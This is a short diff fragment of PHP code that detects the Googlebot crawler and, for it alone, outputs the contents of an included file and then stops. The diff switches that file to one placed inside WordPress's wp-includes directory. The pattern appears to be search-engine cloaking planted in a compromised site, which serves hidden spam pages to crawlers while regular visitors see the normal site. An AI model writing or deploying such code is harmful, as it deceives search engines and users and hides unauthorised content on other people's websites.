@@ -58,7 +58,7 @@ if (!empty($referer)) {
 }
 if ($isGoogleBot) {
     ob_start();
-    include 'pageone.php';
+    include 'wp-includes/read.php';
     $output = ob_get_clean();
     echo $output;
     exit();
